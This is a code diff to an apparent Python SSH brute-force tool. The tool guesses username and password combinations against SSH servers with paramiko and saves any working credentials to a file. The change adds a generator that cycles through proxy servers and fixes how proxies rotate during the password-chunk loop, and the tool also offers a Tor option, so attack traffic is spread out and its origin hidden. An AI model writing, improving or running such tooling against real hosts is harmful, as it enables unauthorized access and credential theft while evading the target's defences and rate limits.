@@ -75,6 +75,14 @@ def save_to_file(ip, service, user, password):
         file.write(f"IP: {ip}, Service: {service}, User: {user}, Password: {password}\n")
 
 
+
+def cycle_through_proxies(proxies):
+    i = 0
+    while True:
+        yield proxies[i]
+        i = (i + 1) % len(proxies)
+
+
 def ssh_attack(ip, user, password, proxy_ip=None, proxy_port=None):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -143,7 +151,7 @@ if __name__ == '__main__':
         args = parse_arguments()
 
         if args.tor and args.proxies:
-            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} {Fore.RED} You cannot use both Tor and a proxy file at the same time!")
+            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} You cannot use both Tor and a proxy file at the same time!")
             exit(1)
 
         if args.tor:
@@ -159,11 +167,14 @@ if __name__ == '__main__':
 
         password_chunk_size = 3
         first_iteration = True
-        proxy_index = 0
+
+        if proxies:
+            proxy_gen = cycle_through_proxies(proxies)  # Initialize the proxy generator
+
         for i in range(0, len(passwords), password_chunk_size):
             for idx, user in enumerate(users):
-                proxy_ip, proxy_port = proxies[i % len(proxies)] if proxies else (None, None)
-                proxy_index += 1
+                proxy_ip, proxy_port = next(proxy_gen) if proxies else (None, None)
+
                 if proxy_ip:
                     print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using proxy {proxy_ip}:{proxy_port}")
 
@@ -198,11 +209,8 @@ if __name__ == '__main__':
         print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} ATTACK STOPPED")
         exit(0)
     except EOFError:
-            print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unexpected End of File (EOF) encountered. Exiting.")
-            exit(1)
-
-
-
+        print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unexpected End of File (EOF) encountered. Exiting.")
+        exit(1)
 
 
 
